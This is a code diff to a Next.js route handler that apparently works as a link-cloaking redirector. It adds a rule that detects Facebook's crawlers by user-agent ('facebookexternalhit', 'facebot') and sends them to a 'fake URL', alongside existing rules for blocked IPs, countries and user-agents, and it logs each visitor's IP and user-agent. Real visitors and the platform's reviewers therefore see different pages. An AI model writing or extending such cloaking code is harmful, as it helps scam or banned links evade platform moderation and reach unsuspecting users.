@@ -1,3 +1,4 @@
+
 import { NextResponse, type NextRequest } from 'next/server';
 
 // This is a mock database lookup. In a real app, you'd fetch this from a database.
@@ -12,6 +13,7 @@ const getRouteConfig = (slug: string) => {
       blockedIps: ['1.2.3.4'],
       allowedCountries: ['US', 'CA'],
       blockedCountries: ['RU', 'CN'],
+      blockFacebookBots: true,
       emergency: false,
     };
   }
@@ -45,14 +47,22 @@ export async function GET(request: NextRequest, { params }: { params: { slug: st
   console.log(`[${slug}] Visitor Info: IP=${ip}, UA=${userAgent}, Country=${country}`);
 
   // 4. Apply filtering rules
+  const userAgentLower = userAgent.toLowerCase();
+  
+  // Rule: Check for Facebook bots
+  if (config.blockFacebookBots && (userAgentLower.includes('facebookexternalhit') || userAgentLower.includes('facebot'))) {
+    console.log(`[${slug}] Facebook Bot detected. Redirecting to fake URL.`);
+    redirectTo = config.fakeUrl;
+  }
+  
   // Rule: Check blocked IPs
-  if (config.blockedIps.includes(ip)) {
+  else if (config.blockedIps.includes(ip)) {
     console.log(`[${slug}] IP ${ip} is blacklisted. Redirecting to fake URL.`);
     redirectTo = config.fakeUrl;
   }
   
   // Rule: Check blocked User-Agents
-  else if (config.blockedUserAgents.some(ua => userAgent.toLowerCase().includes(ua.toLowerCase()))) {
+  else if (config.blockedUserAgents.some(ua => userAgentLower.includes(ua.toLowerCase()))) {
     console.log(`[${slug}] UA ${userAgent} is blacklisted. Redirecting to fake URL.`);
     redirectTo = config.fakeUrl;
   }
@@ -75,3 +85,5 @@ export async function GET(request: NextRequest, { params }: { params: { slug: st
   // 5. Perform the redirect
   return NextResponse.redirect(redirectTo);
 }
+
+    
